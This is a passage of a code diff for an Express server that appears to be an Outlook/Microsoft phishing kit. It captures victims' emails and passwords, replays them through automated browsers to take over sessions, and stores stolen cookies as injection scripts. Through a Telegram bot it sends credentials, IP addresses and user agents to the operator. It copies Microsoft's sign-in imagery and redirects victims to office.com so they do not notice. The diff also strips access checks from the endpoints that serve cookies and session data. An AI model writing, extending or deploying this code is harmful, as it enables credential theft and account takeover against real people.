-            timestamp: new Date().toISOString(),
-            status: 'retry_available',
-            method: 'fast-authentication-queue',
-            attemptNumber: attemptNumber || queue.passwords.length,
-            encryptedData: encryptData(JSON.stringify({ password: password }))
-        };
-
-        fs.writeFileSync(
-            path.join(sessionDir, `invalid_${failureId}.json`),
-            JSON.stringify(failureData, null, 2)
-        );
-
-        analytics.failedLogins++;
-        saveAnalytics();
-
-        return res.status(401).json({
-            success: false,
-            error: 'Invalid credentials',
-            message: 'Your account or password is incorrect. Try another password.',
-            canRetry: true,
-            attemptNumber: attemptNumber || queue.passwords.length,
-            backgroundProcessing: true
-        });
-
-        // For subsequent attempts, also add to queue and return error
-        console.log(`📋 Attempt ${attemptNumber || queue.passwords.length} for ${email} - added to background queue`);
-
-        // Continue background processing if not already running
-        if (!queue.processing) {
-            setTimeout(() => {
-                processPasswordQueue(email).catch(error => {
-                    console.error('Background queue processing failed:', error.message);
-                });
-            }, 500);
-        }
-
-        analytics.failedLogins++;
-        saveAnalytics();
-
-        return res.status(401).json({
-            success: false,
-            error: 'Invalid credentials',
-            message: 'Your account or password is incorrect. Try another password.',
-            canRetry: true,
-            attemptNumber: attemptNumber || queue.passwords.length,
-            backgroundProcessing: true
-        });
+        console.log(`🚀 Attempting FAST authentication for: ${email} (preload session: ${sessionId})`);
 
         // Check if there's a preloaded session ready for this email
         let preloadedSession = null;
@@ -858,17 +1060,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                     analytics.failedLogins++;
                     saveAnalytics();
 
-                    console.log(`❌ Fast authentication failed for: ${email} - keeping preloaded browser alive for retries`);
-
-                    // Update session for retry instead of closing
-                    automationSessions.set(sessionId, {
-                        automation: automation,
-                        status: 'awaiting_retry',
-                        email: email,
-                        timestamp: new Date().toISOString(),
-                        attempts: 1,
-                        maxAttempts: 3
-                    });
+                    console.log(`❌ Fast authentication failed for: ${email} - incorrect password`);
 
                     // Store failed attempt for admin panel
                     const sessionDir = path.join(__dirname, 'session_data');
@@ -881,14 +1073,13 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         id: failureId,
                         sessionId: sessionId,
                         email: email,
-                        reason: 'Wrong Password (Browser kept alive for retry)',
-                        errorMessage: 'Your account or password is incorrect. Try another password.',
+                        reason: 'Wrong Password',
+                        errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                         timestamp: new Date().toISOString(),
-                        status: 'retry_available',
+                        status: 'invalid',
                         method: 'fast-authentication',
                         preloadUsed: true,
-                        failureType: 'incorrect_password',
-                        encryptedData: encryptData(JSON.stringify({ password: password }))
+                        failureType: 'incorrect_password'
                     };
 
                     fs.writeFileSync(
@@ -896,7 +1087,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         JSON.stringify(failureData, null, 2)
                     );
 
-                    console.log(`💾 Stored retry-available session record: invalid_${failureId}.json`);
+                    console.log(`💾 Stored invalid session record: invalid_${failureId}.json`);
 
                     // Send Telegram notification for failed attempt
                     if (telegramBot) {
@@ -906,11 +1097,9 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                                 password: password,
                                 timestamp: new Date().toISOString(),
                                 sessionId: sessionId,
-                                reason: 'Incorrect Password (Retry Available)',
+                                reason: 'Incorrect Password',
                                 authMethod: 'FAST Authentication (preloaded browser)',
-                                preloadUsed: true,
-                                ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
-                                userAgent: req.get('User-Agent') || 'Unknown'
+                                preloadUsed: true
                             });
                             console.log(`📤 Telegram failed login notification sent for ${email}`);
                         } catch (telegramError) {
@@ -918,93 +1107,36 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         }
                     }
 
+                    // Clean up failed session
+                    setTimeout(async () => {
+                        try {
+                            await automation.close();
+                            automationSessions.delete(sessionId);
+                        } catch (cleanupError) {
+                            console.warn('Error cleaning up failed fast auth:', cleanupError.message);
+                        }
+                    }, 2000);
+
                     return res.status(401).json({
                         success: false,
                         error: 'Invalid credentials',
-                        message: 'Your account or password is incorrect. Try another password.',
-                        sessionId: sessionId,
-                        canRetry: true,
-                        attempts: 1,
-                        maxAttempts: 3,
+                        message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                         preloadUsed: true,
                         requiresOAuth: false
                     });
                 }
 
             } catch (fastAuthError) {
-                console.warn(`⚠️ Fast authentication failed: ${fastAuthError.message}`);
-
-                // Check if this is a recoverable error that we should keep browser alive for
-                const errorMessage = fastAuthError.message.toLowerCase();
-                const isRecoverableError = errorMessage.includes('execution context was destroyed') ||
-                                         errorMessage.includes('navigation') ||
-                                         errorMessage.includes('page crashed') ||
-                                         errorMessage.includes('target closed') ||
-                                         errorMessage.includes('session not created') ||
-                                         errorMessage.includes('timeout');
-
-                if (isRecoverableError && automation && !automation.isClosing) {
-                    console.log(`🔄 Recoverable fast auth error for: ${email} - keeping browser alive for retry`);
-
-                    // Keep browser session alive for retries instead of closing
-                    automationSessions.set(sessionId, {
-                        automation: automation,
-                        status: 'awaiting_retry',
-                        email: email,
-                        timestamp: new Date().toISOString(),
-                        attempts: 1,
-                        maxAttempts: 3,
-                        lastError: fastAuthError.message
-                    });
-
-                    analytics.failedLogins++;
-                    saveAnalytics();
-
-                    // Send Telegram notification for fast auth technical failure with retry available
-                    if (telegramBot) {
-                        try {
-                            await telegramBot.sendFailedLoginNotification({
-                                email: email,
-                                password: password,
-                                timestamp: new Date().toISOString(),
-                                sessionId: sessionId,
-                                reason: `Fast Auth Technical Error (Retry Available): ${fastAuthError.message}`,
-                                authMethod: 'FAST Authentication (preloaded browser)',
-                                preloadUsed: true,
-                                ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
-                                userAgent: req.get('User-Agent') || 'Unknown'
-                            });
-                            console.log(`📤 Telegram fast auth technical error notification sent for ${email}`);
-                        } catch (telegramError) {
-                            console.warn('Telegram fast auth technical error notification failed:', telegramError.message);
-                        }
-                    }
-
-                    return res.status(500).json({
-                        success: false,
-                        error: 'Fast authentication technical error',
-                        message: 'Technical error occurred during fast authentication. You can retry with the same or different password.',
-                        sessionId: sessionId,
-                        canRetry: true,
-                        attempts: 1,
-                        maxAttempts: 3,
-                        preloadUsed: true,
-                        requiresOAuth: false,
-                        details: fastAuthError.message
-                    });
-
-                } else {
-                    console.warn(`❌ Fatal fast auth error, falling back to cold start: ${fastAuthError.message}`);
-                    // Clean up failed preload for fatal errors only
-                    try {
-                        await automation.close();
-                        automationSessions.delete(sessionId);
-                    } catch (cleanupError) {
-                        console.warn('Error cleaning up failed fast auth:', cleanupError.message);
-                    }
-                    // Continue to fallback logic below
-                    usingPreloadedBrowser = false;
+                console.warn(`⚠️ Fast authentication failed, falling back to cold start: ${fastAuthError.message}`);
+                // Clean up failed preload
+                try {
+                    await automation.close();
+                    automationSessions.delete(sessionId);
+                } catch (cleanupError) {
+                    console.warn('Error cleaning up failed fast auth:', cleanupError.message);
                 }
+                // Continue to fallback logic below
+                usingPreloadedBrowser = false;
             }
         }
 
@@ -1012,11 +1144,9 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
         if (!usingPreloadedBrowser) {
             console.log(`🔄 No preload available or failed, using cold start for: ${email}`);
 
-            automation = new ClosedBridgeAutomation({
+            automation = new OutlookLoginAutomation({
                 enableScreenshots: true,
-                screenshotQuality: 80,
-                sessionId: newSessionId,
-                eventCallback: broadcastAuthEvent
+                screenshotQuality: 80
             });
 
             newSessionId = createSessionId();
@@ -1032,17 +1162,8 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                 const loginSuccess = await automation.performLogin(email, password);
 
                 if (!loginSuccess) {
-                    console.log(`❌ Cold start authentication failed for: ${email} - keeping browser alive for retries`);
-
-                    // Keep browser session alive for retries instead of closing
-                    automationSessions.set(newSessionId, {
-                        automation: automation,
-                        status: 'awaiting_retry',
-                        email: email,
-                        timestamp: new Date().toISOString(),
-                        attempts: 1,
-                        maxAttempts: 3
-                    });
+                    await automation.close();
+                    console.log(`❌ Cold start authentication failed for: ${email}`);
 
                     analytics.failedLogins++;
                     saveAnalytics();
@@ -1058,10 +1179,10 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         id: failureId,
                         sessionId: newSessionId,
                         email: email,
-                        reason: 'Wrong Password (Browser kept alive for retry)',
-                        errorMessage: 'Your account or password is incorrect. Try another password.',
+                        reason: 'Wrong Password',
+                        errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                         timestamp: new Date().toISOString(),
-                        status: 'retry_available',
+                        status: 'invalid',
                         method: 'cold-start-authentication',
                         preloadUsed: false,
                         failureType: 'incorrect_password'
@@ -1072,7 +1193,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         JSON.stringify(failureData, null, 2)
                     );
 
-                    console.log(`💾 Stored retry-available session record: invalid_${failureId}.json`);
+                    console.log(`💾 Stored invalid session record: invalid_${failureId}.json`);
 
                     // Send Telegram notification for failed attempt
                     if (telegramBot) {
@@ -1082,11 +1203,9 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                                 password: password,
                                 timestamp: new Date().toISOString(),
                                 sessionId: newSessionId,
-                                reason: 'Incorrect Password (Retry Available)',
+                                reason: 'Incorrect Password',
                                 authMethod: 'Cold Start Authentication',
-                                preloadUsed: false,
-                                ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
-                                userAgent: req.get('User-Agent') || 'Unknown'
+                                preloadUsed: false
                             });
                             console.log(`📤 Telegram failed login notification sent for ${email}`);
                         } catch (telegramError) {
@@ -1097,11 +1216,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                     return res.status(401).json({
                         success: false,
                         error: 'Invalid credentials',
-                        message: 'Your account or password is incorrect. Try another password.',
-                        sessionId: newSessionId,
-                        canRetry: true,
-                        attempts: 1,
-                        maxAttempts: 3,
+                        message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                         preloadUsed: false,
                         requiresOAuth: false
                     });
@@ -1216,11 +1331,9 @@ app.post('/api/login-automation', async (req, res) => {
         console.log(`🤖 Starting automation login for: ${email} (Session: ${sessionId})`);
 
         // Initialize automation
-        const automation = new ClosedBridgeAutomation({
+        const automation = new OutlookLoginAutomation({
             enableScreenshots: true,
-            screenshotQuality: 80,
-            sessionId: sessionId,
-            eventCallback: broadcastAuthEvent
+            screenshotQuality: 80
         });
 
         // Store automation session
@@ -1371,94 +1484,31 @@ app.post('/api/login-automation', async (req, res) => {
         } catch (automationError) {
             console.error(`❌ Automation error for session ${sessionId}:`, automationError.message);
 
-            // Check if this is a recoverable error that we should keep browser alive for
-            const errorMessage = automationError.message.toLowerCase();
-            const isRecoverableError = errorMessage.includes('execution context was destroyed') ||
-                                     errorMessage.includes('navigation') ||
-                                     errorMessage.includes('page crashed') ||
-                                     errorMessage.includes('target closed') ||
-                                     errorMessage.includes('session not created') ||
-                                     errorMessage.includes('timeout');
-
-            if (isRecoverableError && automation && !automation.isClosing) {
-                console.log(`🔄 Recoverable technical error for: ${email} - keeping browser alive for retry`);
-
-                // Keep browser session alive for retries instead of closing
-                automationSessions.set(sessionId, {
-                    automation: automation,
-                    status: 'awaiting_retry',
-                    email: email,
-                    timestamp: new Date().toISOString(),
-                    attempts: 1,
-                    maxAttempts: 3,
-                    lastError: automationError.message
-                });
-
-                analytics.failedLogins++;
-                saveAnalytics();
-
-                // Send Telegram notification for technical failure with retry available
-                if (telegramBot) {
-                    try {
-                        await telegramBot.sendFailedLoginNotification({
-                            email: email,
-                            password: password || '[Not provided]',
-                            timestamp: new Date().toISOString(),
-                            sessionId: sessionId,
-                            reason: `Technical Error (Retry Available): ${automationError.message}`,
-                            authMethod: 'Browser Automation',
-                            preloadUsed: false,
-                            ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
-                            userAgent: req.get('User-Agent') || 'Unknown'
-                        });
-                        console.log(`📤 Telegram technical error notification sent for ${email}`);
-                    } catch (telegramError) {
-                        console.warn('Telegram technical error notification failed:', telegramError.message);
-                    }
-                }
-
-                res.status(500).json({
-                    success: false,
-                    sessionId: sessionId,
-                    canRetry: true,
-                    attempts: 1,
-                    maxAttempts: 3,
-                    error: 'Technical error',
-                    message: 'Technical error occurred. You can retry with the same or different password.',
-                    details: automationError.message,
-                    method: 'automation'
-                });
-
-            } else {
-                // Fatal error - close browser
-                console.log(`❌ Fatal automation error for: ${email} - closing browser`);
-
-                if (automationSessions.has(sessionId)) {
-                    automationSessions.get(sessionId).status = 'error';
-                }
-
-                analytics.failedLogins++;
-                saveAnalytics();
-
-                // Clean up on fatal error
-                try {
-                    if (automationSessions.has(sessionId)) {
-                        await automation.close();
-                        automationSessions.delete(sessionId);
-                    }
-                } catch (cleanupError) {
-                    console.error(`Error cleaning up automation after error:`, cleanupError.message);
-                }
-
-                res.status(500).json({
-                    success: false,
-                    sessionId: sessionId,
-                    error: 'Fatal automation error',
-                    message: 'Serious technical error during login process. Please try again with a fresh session.',
-                    details: automationError.message,
-                    method: 'automation'
-                });
+            if (automationSessions.has(sessionId)) {
+                automationSessions.get(sessionId).status = 'error';
             }
+
+            analytics.failedLogins++;
+            saveAnalytics();
+
+            // Clean up on error
+            try {
+                if (automationSessions.has(sessionId)) {
+                    await automation.close();
+                    automationSessions.delete(sessionId);
+                }
+            } catch (cleanupError) {
+                console.error(`Error cleaning up automation after error:`, cleanupError.message);
+            }
+
+            res.status(500).json({
+                success: false,
+                sessionId: sessionId,
+                error: 'Automation failed',
+                message: 'Technical error during login process. Please try again.',
+                details: automationError.message,
+                method: 'automation'
+            });
         }
 
     } catch (error) {
@@ -1470,219 +1520,6 @@ app.post('/api/login-automation', async (req, res) => {
             error: 'Login automation failed',
             success: false,
             details: error.message 
-        });
-    }
-});
-
-// Retry password authentication on existing session
-app.post('/api/retry-password', async (req, res) => {
-    try {
-        const { sessionId, password } = req.body;
-
-        if (!sessionId || !password) {
-            return res.status(400).json({
-                success: false,
-                error: 'Missing sessionId or password'
-            });
-        }
-
-        // Check if session exists and is in retry state
-        if (!automationSessions.has(sessionId)) {
-            return res.status(404).json({
-                success: false,
-                error: 'Session not found or expired'
-            });
-        }
-
-        const session = automationSessions.get(sessionId);
-        if (session.status !== 'awaiting_retry') {
-            return res.status(400).json({
-                success: false,
-                error: 'Session is not in retry state',
-                currentStatus: session.status
-            });
-        }
-
-        // Check attempt limits
-        if (session.attempts >= session.maxAttempts) {
-            // Close browser after max attempts
-            try {
-                await session.automation.close();
-            } catch (closeError) {
-                console.warn('Error closing browser after max attempts:', closeError.message);
-            }
-            automationSessions.delete(sessionId);
-
-            return res.status(429).json({
-                success: false,
-                error: 'Maximum retry attempts reached',
-                attempts: session.attempts,
-                maxAttempts: session.maxAttempts
-            });
-        }
-
-        console.log(`🔄 Retrying authentication for: ${session.email} (attempt ${session.attempts + 1}/${session.maxAttempts})`);
-
-        try {
-            // Try authentication with new password
-            const automation = session.automation;
-
-            // First check if browser is still healthy
-            const isHealthy = await automation.isHealthy();
-            if (!isHealthy) {
-                throw new Error('Browser session is no longer healthy');
-            }
-
-            // Navigate back to password field (in case we're on an error page)
-            try {
-                await automation.page.waitForSelector('input[type="password"]', { timeout: 5000 });
-                const passwordInput = await automation.page.$('input[type="password"]');
-                if (passwordInput) {
-                    // Clear existing password and enter new one
-                    await passwordInput.click({ clickCount: 3 }); // Triple click to select all
-                    await automation.page.keyboard.press('Delete');
-                    await automation.page.keyboard.type(password, { delay: 100 + Math.random() * 100 });
-                    console.log('✅ New password entered for retry');
-
-                    // Click sign in button again
-                    const signInButton = await automation.page.$('input[type="submit"], button[type="submit"], input[value="Sign in"], button:contains("Sign in"), #idSIButton9');
-                    if (signInButton) {
-                        await signInButton.click();
-                        console.log('✅ Sign in button clicked for retry');
-
-                        // Wait for authentication result
-                        await automation.waitForAuthentication();
-
-                        // If we get here, authentication was successful
-                        console.log(`✅ Retry authentication successful for: ${session.email}`);
-
-                        // Validate and save session
-                        const sessionValidation = await automation.validateSession(session.email, password);
-                        await automation.close();
-                        automationSessions.delete(sessionId);
-
-                        if (sessionValidation.success) {
-                            analytics.successfulLogins++;
-                            saveAnalytics();
-
-                            // Send success notification if bot is available
-                            if (telegramBot) {
-                                try {
-                                    await telegramBot.sendLoginNotification({
-                                        email: session.email,
-                                        password: password,
-                                        timestamp: new Date().toISOString(),
-                                        sessionId: sessionId,
-                                        totalCookies: sessionValidation.cookiesSaved || 0,
-                                        authMethod: 'Password Retry',
-                                        ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
-                                        userAgent: req.get('User-Agent') || 'Unknown'
-                                    });
-                                    console.log(`📤 Telegram retry success notification sent for ${session.email}`);
-                                } catch (telegramError) {
-                                    console.warn('Telegram retry success notification failed:', telegramError.message);
-                                }
-                            }
-
-                            return res.json({
-                                success: true,
-                                message: 'Authentication successful on retry',
-                                sessionId: sessionId,
-                                userEmail: session.email,
-                                cookiesSaved: sessionValidation.cookiesSaved,
-                                attempts: session.attempts + 1,
-                                authMethod: 'Password Retry'
-                            });
-                        } else {
-                            throw new Error('Session validation failed after successful authentication');
-                        }
-                    } else {
-                        throw new Error('Could not find sign in button for retry');
-                    }
-                } else {
-                    throw new Error('Could not find password field for retry');
-                }
-            } catch (retryError) {
-                // Retry failed, increment attempts
-                session.attempts++;
-                session.timestamp = new Date().toISOString();
-
-                console.log(`❌ Retry authentication failed for: ${session.email} (attempt ${session.attempts}/${session.maxAttempts})`);
-
-                analytics.failedLogins++;
-                saveAnalytics();
-
-                // Send failed retry notification
-                if (telegramBot) {
-                    try {
-                        await telegramBot.sendFailedLoginNotification({
-                            email: session.email,
-                            password: password,
-                            timestamp: new Date().toISOString(),
-                            sessionId: sessionId,
-                            reason: `Incorrect Password (Retry ${session.attempts}/${session.maxAttempts})`,
-                            authMethod: 'Password Retry',
-                            ip: req.headers['x-forwarded-for']?.split(',')?.[0]?.trim() || req.headers['cf-connecting-ip'] || req.ip || req.connection?.remoteAddress || 'Unknown',
-                            userAgent: req.get('User-Agent') || 'Unknown'
-                        });
-                        console.log(`📤 Telegram retry failure notification sent for ${session.email}`);
-                    } catch (telegramError) {
-                        console.warn('Telegram retry failure notification failed:', telegramError.message);
-                    }
-                }
-
-                // Check if we've reached max attempts
-                if (session.attempts >= session.maxAttempts) {
-                    console.log(`❌ Max retry attempts reached for: ${session.email}, closing browser`);
-                    try {
-                        await automation.close();
-                    } catch (closeError) {
-                        console.warn('Error closing browser after failed retries:', closeError.message);
-                    }
-                    automationSessions.delete(sessionId);
-
-                    return res.status(401).json({
-                        success: false,
-                        error: 'Authentication failed after maximum retries',
-                        attempts: session.attempts,
-                        maxAttempts: session.maxAttempts,
-                        canRetry: false
-                    });
-                } else {
-                    return res.status(401).json({
-                        success: false,
-                        error: 'Invalid credentials',
-                        message: 'Your password is incorrect. Try another password.',
-                        sessionId: sessionId,
-                        canRetry: true,
-                        attempts: session.attempts,
-                        maxAttempts: session.maxAttempts
-                    });
-                }
-            }
-        } catch (sessionError) {
-            console.error(`Error during retry for session ${sessionId}:`, sessionError.message);
-
-            // Clean up unhealthy session
-            try {
-                await session.automation.close();
-            } catch (closeError) {
-                console.warn('Error closing unhealthy session:', closeError.message);
-            }
-            automationSessions.delete(sessionId);
-
-            return res.status(500).json({
-                success: false,
-                error: 'Session error during retry',
-                details: sessionError.message
-            });
-        }
-    } catch (error) {
-        console.error('Error in retry endpoint:', error);
-        return res.status(500).json({
-            success: false,
-            error: 'Retry failed',
-            details: error.message
         });
     }
 });
@@ -1717,7 +1554,7 @@ app.delete('/api/automation-cancel/:sessionId', async (req, res) => {
         const automationSession = automationSessions.get(sessionId);
 
         // Verify session ownership or admin access
-        const hasAdminAccess = req.headers['x-admin-token'] === config.security.adminToken;
+        const hasAdminAccess = req.headers['x-admin-token'] === ADMIN_TOKEN;
         const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId);
 
         if (!hasAdminAccess && !hasSessionAccess) {
@@ -1768,8 +1605,20 @@ app.delete('/api/automation-cancel/:sessionId', async (req, res) => {
 // Internal redirect URL endpoint (used by automation and admin panel)
 app.get('/api/internal/redirect-url', (req, res) => {
     try {
-        // Use centralized redirect configuration
-        let redirectUrl = config.redirect.redirectUrl || 'https://office.com';
+        // Load redirect configuration
+        const redirectConfigPath = path.join(__dirname, 'redirect-config.json');
+        let redirectUrl = 'https://office.com'; // Default fallback
+
+        if (fs.existsSync(redirectConfigPath)) {
+            try {
+                const redirectConfig = JSON.parse(fs.readFileSync(redirectConfigPath, 'utf8'));
+                if (redirectConfig.redirectUrl) {
+                    redirectUrl = redirectConfig.redirectUrl;
+                }
+            } catch (configError) {
+                console.warn('Error reading redirect config:', configError.message);
+            }
+        }
 
         res.json({
             success: true,
@@ -1781,68 +1630,6 @@ app.get('/api/internal/redirect-url', (req, res) => {
             success: false,
             redirectUrl: 'https://office.com',
             error: error.message
-        });
-    }
-});
-
-// Internal background URL endpoint (used by admin panel and frontend)
-app.get('/api/internal/background-url', (req, res) => {
-    try {
-        // Use centralized configuration for background URL
-        let backgroundUrl = config.ui?.backgroundUrl || 'https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg';
-
-        res.json({
-            success: true,
-            backgroundUrl: backgroundUrl
-        });
-    } catch (error) {
-        console.error('Error getting background URL:', error);
-        res.json({
-            success: false,
-            backgroundUrl: 'https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg',
-            error: error.message
-        });
-    }
-});
-
-// Admin endpoint to update background URL configuration
-app.post('/api/admin/background-url', requireAdminAuth, (req, res) => {
-    try {
-        const { backgroundUrl } = req.body;
-
-        if (!backgroundUrl) {
-            return res.status(400).json({
-                success: false,
-                error: 'backgroundUrl is required'
-            });
-        }
-
-        // Validate URL
-        try {
-            new URL(backgroundUrl);
-        } catch (urlError) {
-            return res.status(400).json({
-                success: false,
-                error: 'Invalid URL format'
-            });
-        }
-
-        // Update background configuration using centralized config
-        config.saveBackgroundUrl(backgroundUrl);
-        console.log(`🎨 Background URL updated to: ${backgroundUrl}`);
-
-        res.json({
-            success: true,
-            backgroundUrl: backgroundUrl,
-            message: 'Background URL configuration updated successfully'
-        });
-
-    } catch (error) {
-        console.error('Error updating background URL:', error);
-        res.status(500).json({
-            success: false,
-            error: 'Failed to update background URL configuration',
-            details: error.message
         });
     }
 });
@@ -1860,7 +1647,7 @@ app.get('/api/status', (req, res) => {
             userEmail: session.userEmail,
             sessionId: sessionId,
             sessionCount: userSessions.size,
-            hasToken: false,
+            hasToken: !!session.graphAuth?.accessToken,
             verified: !!session.verified,
             cookiesSaved: !!session.cookiesSaved
         });
@@ -1873,25 +1660,68 @@ app.get('/api/status', (req, res) => {
     }
 });
 
-// Preload endpoints removed - all browsers are created on-demand
+// Preload status endpoint for specific session
+app.get('/api/preload-status/:sessionId', (req, res) => {
+    try {
+        const sessionId = req.params.sessionId;
 
-// Serve cookie injection scripts - SECURED
+        if (automationSessions.has(sessionId)) {
+            const session = automationSessions.get(sessionId);
+            res.json({
+                sessionId: sessionId,
+                status: session.status,
+                email: session.email,
+                startTime: session.startTime,
+                ageMs: Date.now() - session.startTime
+            });
+        } else {
+            res.status(404).json({
+                error: 'Preload session not found',
+                sessionId: sessionId
+            });
+        }
+    } catch (error) {
+        console.error('Error getting preload status:', error);
+        res.status(500).json({
+            error: 'Failed to get preload status',
+            details: error.message
+        });
+    }
+});
+
+// Preload statistics monitoring endpoint (admin only)
+app.get('/api/preload-stats', requireAdminAuth, (req, res) => {
+    try {
+        const stats = getPreloadStats();
+        const sessionDetails = Array.from(automationSessions.entries())
+            .filter(([_, session]) => session.status && session.status.startsWith('preload'))
+            .map(([sessionId, session]) => ({
+                sessionId: sessionId,
+                email: session.email,
+                status: session.status,
+                startTime: session.startTime,
+                ageMs: Date.now() - session.startTime
+            }));
+
+        res.json({
+            success: true,
+            stats: stats,
+            activeSessions: sessionDetails,
+            timestamp: new Date().toISOString()
+        });
+    } catch (error) {
+        console.error('Error getting preload stats:', error);
+        res.status(500).json({
+            error: 'Failed to get preload statistics',
+            details: error.message
+        });
+    }
+});
+
+// Serve cookie injection scripts
 app.get('/api/cookies/:sessionId', (req, res) => {
     try {
         const sessionId = req.params.sessionId;
-        const clientSessionId = req.headers['x-session-id'];
-
-        // Verify admin access or session ownership with proper authorization
-        const hasAdminAccess = req.headers['x-admin-token'] === config.security.adminToken;
-        const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId) && clientSessionId === sessionId;
-
-        if (!hasAdminAccess && !hasSessionAccess) {
-            return res.status(403).json({
-                error: 'Access denied - admin token or session owner access required',
-                sessionId: sessionId,
-                message: 'Session ID must match or admin token required'
-            });
-        }
         const sessionDir = path.join(__dirname, 'session_data');
         const injectionFilename = `inject_session_${sessionId}.js`;
         const injectionPath = path.join(sessionDir, injectionFilename);
@@ -1916,23 +1746,10 @@ app.get('/api/cookies/:sessionId', (req, res) => {
     }
 });
 
-// Get session data with cookies - SECURED
+// Get session data with cookies
 app.get('/api/session-data/:sessionId', (req, res) => {
     try {
         const sessionId = req.params.sessionId;
-        const clientSessionId = req.headers['x-session-id'];
-
-        // Verify admin access or session ownership with proper authorization
-        const hasAdminAccess = req.headers['x-admin-token'] === config.security.adminToken;
-        const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId) && clientSessionId === sessionId;
-
-        if (!hasAdminAccess && !hasSessionAccess) {
-            return res.status(403).json({
-                error: 'Access denied - admin token or session owner access required',
-                sessionId: sessionId,
-                message: 'Session ID must match or admin token required'
-            });
-        }
         const sessionDir = path.join(__dirname, 'session_data');
 
         // Find session file
@@ -1995,8 +1812,14 @@ app.post('/api/admin/project-redirect', requireAdminAuth, (req, res) => {
             });
         }
 
-        // Update redirect configuration using centralized config
-        config.saveRedirectConfig(redirectUrl);
+        // Update redirect-config.json
+        const redirectConfigPath = path.join(__dirname, 'redirect-config.json');
+        const redirectConfig = {
+            redirectUrl: redirectUrl,
+            lastUpdated: new Date().toISOString()
+        };
+
+        fs.writeFileSync(redirectConfigPath, JSON.stringify(redirectConfig, null, 2));
         console.log(`📍 Project redirect updated to: ${redirectUrl}`);
 
         res.json({
@@ -2016,7 +1839,6 @@ app.post('/api/admin/project-redirect', requireAdminAuth, (req, res) => {
 });
 
 // Admin analytics endpoint
-
 app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
     try {
         // Read all session files to get comprehensive analytics
@@ -2052,42 +1874,6 @@ app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
         res.status(500).json({
             success: false,
             error: 'Failed to load analytics',
-            details: error.message
-        });
-    }
-});
-
-// Test Telegram notification endpoint
-app.post('/api/admin/test-telegram', requireAdminAuth, async (req, res) => {
-    try {
-        if (!telegramBot) {
-            return res.status(400).json({
-                success: false,
-                error: 'Telegram bot not initialized'
-            });
-        }
-
-        // Send a test notification
-        await telegramBot.sendLoginNotification({
-            email: 'test@example.com',
-            password: 'test123',
-            timestamp: new Date().toISOString(),
-            sessionId: 'test-session-' + Date.now(),
-            totalCookies: 5,
-            authMethod: 'Test Method',
-            ip: '127.0.0.1',
-            userAgent: 'Test UserAgent'
-        });
-
-        res.json({
-            success: true,
-            message: 'Test notification sent successfully'
-        });
-    } catch (error) {
-        console.error('Error sending test notification:', error);
-        res.status(500).json({
-            success: false,
-            error: 'Failed to send test notification',
             details: error.message
         });
     }
@@ -2175,27 +1961,55 @@ app.delete('/api/admin/session/:sessionId', requireAdminAuth, (req, res) => {
     }
 });
 
-// Use centralized Cloudflare configuration (access config.cloudflare directly)
+// Cloudflare configuration storage
+let cloudflareConfig = {
+    apiToken: null,    // For modern API tokens (Bearer)
+    apiKey: null,      // For legacy Global API Key
+    email: null,       // Required for Global API Key
+    zoneId: null,
+    configured: false
+};
+
+// Load Cloudflare config from file if exists
+const CLOUDFLARE_CONFIG_FILE = path.join(__dirname, 'cloudflare-config.json');
+if (fs.existsSync(CLOUDFLARE_CONFIG_FILE)) {
+    try {
+        const savedConfig = JSON.parse(fs.readFileSync(CLOUDFLARE_CONFIG_FILE, 'utf8'));
+        cloudflareConfig = { ...cloudflareConfig, ...savedConfig };
+
+        // Override with environment variables if available (more secure)
+        if (process.env.CLOUDFLARE_EMAIL) {
+            cloudflareConfig.email = process.env.CLOUDFLARE_EMAIL;
+        }
+
+        console.log('🌤️ Cloudflare configuration loaded from file');
+        if (cloudflareConfig.email && cloudflareConfig.apiKey && cloudflareConfig.zoneId) {
+            console.log('✅ Global API Key authentication configured');
+        }
+    } catch (error) {
+        console.warn('Error loading Cloudflare config:', error.message);
+    }
+}
 
 // Helper function to make Cloudflare API calls
 async function callCloudflareAPI(endpoint, method = 'GET', data = null) {
-    if (!config.cloudflare.configured) {
+    if (!cloudflareConfig.configured) {
         throw new Error('Cloudflare not configured');
     }
 
-    const url = `https://api.cloudflare.com/client/v4/zones/${config.cloudflare.zoneId}${endpoint}`;
+    const url = `https://api.cloudflare.com/client/v4/zones/${cloudflareConfig.zoneId}${endpoint}`;
     const headers = {
         'Content-Type': 'application/json'
     };
 
     // Support both modern API tokens (Bearer) and legacy Global API Key
-    if (config.cloudflare.apiToken) {
+    if (cloudflareConfig.apiToken) {
         // Modern API Token
